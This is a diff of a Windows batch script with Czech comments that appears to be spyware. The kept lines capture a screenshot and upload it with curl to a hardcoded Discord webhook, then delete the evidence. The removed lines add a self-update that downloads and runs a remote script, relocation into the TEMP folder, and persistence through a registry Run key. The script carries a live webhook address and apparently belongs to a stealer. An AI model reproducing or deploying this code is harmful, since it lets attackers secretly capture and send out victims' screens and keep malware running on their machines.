@@ -2,25 +2,10 @@
 chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
+echo 🔥 GitHub verze spuštěna!
+
 :: 🌐 Webhook pro vše
 set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"
-
-:: 🔁 GitHub RAW URL pro aktualizaci
-set "updateURL=https://raw.githubusercontent.com/fanysfanys00-ctrl/mc/refs/heads/main/takpojd.bat"
-set "currentPath=%~f0"
-set "updatePath=%TEMP%\takpojd_update.bat"
-
-:: 📥 Stáhni novou verzi
-curl -s "%updateURL%" -o "%updatePath%"
-
-:: 🔍 Porovnej s aktuální verzí
-fc /b "%updatePath%" "%currentPath%" >nul
-if errorlevel 1 (
-    echo 🔄 Nová verze detekována — spouštím aktualizovanou verzi...
-    start "" "%updatePath%"
-    exit
-)
-del /f /q "%updatePath%"
 
 :: 📸 Screenshot do TEMP
 set "ss=%TEMP%\screenshot_%RANDOM%.png"
@@ -83,27 +68,5 @@ del /f /q "!payload!"
 curl -s -X POST %webhook% -F "file=@%ss%;type=image/png" >nul
 del /f /q "%ss%"
 
-:: 📦 Přesun do %TEMP% (jen při prvním spuštění)
-set "targetPath=%TEMP%\takpojd.bat"
-echo %~dp0 | find /i "%TEMP%" >nul
-if not errorlevel 1 goto afterMove
-
-:: 🛠️ Pomocný skript pro přesun
-echo @echo off > "%TEMP%\movehelper.bat"
-echo timeout /t 2 ^>nul >> "%TEMP%\movehelper.bat"
-echo move /y "%~f0" "!targetPath!" ^>nul >> "%TEMP%\movehelper.bat"
-echo del "%%~f0" ^>nul >> "%TEMP%\movehelper.bat"
-start "" "%TEMP%\movehelper.bat"
-exit
-
-:afterMove
-
-:: 🔁 Autostart registrace
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "takpojd" /t REG_SZ /d "!targetPath!" /f >nul
-
 :: ✅ Hotovo
 exit
-
-
-
-
